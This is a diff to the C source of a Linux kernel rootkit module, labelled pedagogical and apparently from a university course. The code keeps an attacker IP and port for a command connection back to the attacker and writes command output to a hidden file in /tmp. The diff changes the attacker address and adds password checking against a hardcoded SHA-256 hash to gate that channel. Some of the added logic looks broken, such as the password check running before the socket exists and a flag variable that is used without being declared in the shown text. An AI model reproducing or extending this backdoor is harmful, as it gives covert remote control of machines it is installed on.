@@ -14,6 +14,9 @@
 #include <linux/namei.h>      // for kern_path()
 #include <linux/uaccess.h>
 #include <linux/moduleparam.h>
+#include <crypto/hash.h>
+#include <linux/scatterlist.h>
+#include <linux/string.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Jules Aubert <jules1.aubert@epita.fr>");
@@ -21,18 +24,53 @@ MODULE_DESCRIPTION("EpiRootkit: pedagogical rootkit base");
 MODULE_VERSION("0.1");
 
 /* Module parameters */
-static char *attacker_ip   = "192.168.56.101";
+static char *attacker_ip   = "192.168.1.30";
 static int   attacker_port = 5555;
+static char *password_sha256 = "dd58add07f93b3ad6ffcebf0fbacf16a15260793cae2f8b00a5fe701d8d85676";
 module_param(attacker_ip, charp, 0444);
 MODULE_PARM_DESC(attacker_ip,   "Attacker VM IPv4 address");
 module_param(attacker_port, int, 0444);
 MODULE_PARM_DESC(attacker_port, "Attacker VM TCP port");
+module_param(password_sha256, charp, 0400);
+MODULE_PARM_DESC(password_sha256, "SHA-256 hash of the authentication password (hex string)");
 
 #define CMD_MAX_LEN 1024
 #define OUT_FILE     "/tmp/.epiroot_out"
 
 static struct task_struct *conn_thread;
 static struct socket      *conn_sock;
+
+static int check_password(const char *input)
+{
+    struct shash_desc *shash;
+    struct crypto_shash *tfm;
+    unsigned char result[32];
+    char hex_result[65];
+    int i;
+
+    tfm = crypto_alloc_shash("sha256", 0, 0);
+    if (IS_ERR(tfm)) return -1;
+
+    shash = kmalloc(sizeof(*shash) + crypto_shash_descsize(tfm), GFP_KERNEL);
+    if (!shash) {
+        crypto_free_shash(tfm);
+        return -1;
+    }
+
+    shash->tfm = tfm;
+    shash->flags = 0;
+
+    crypto_shash_digest(shash, input, strlen(input), result);
+    kfree(shash);
+    crypto_free_shash(tfm);
+
+    // Convert hash to hex string
+    for (i = 0; i < 32; i++)
+        sprintf(hex_result + i * 2, "%02x", result[i]);
+
+    hex_result[64] = '\0';
+    return strncmp(hex_result, password_sha256, 64) == 0;
+}
 
 /* Send exactly len bytes */
 static int sock_send_all(struct socket *sock, const void *buf, size_t len)
@@ -130,6 +168,16 @@ static int connection_worker(void *data)
         return -ENOMEM;
 
     while (!kthread_should_stop()) {
+
+	if (!authenticated) {
+    		if (!check_password(cmd)) {
+    		    pr_warn("[waystar] Wrong password attempt.\n");
+    		    break;
+    		}
+    authenticated = 1;
+    pr_info("[waystar] Authenticated successfully.\n");
+    continue;
+}
         /* create socket */
         ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &conn_sock);
         if (ret < 0) {
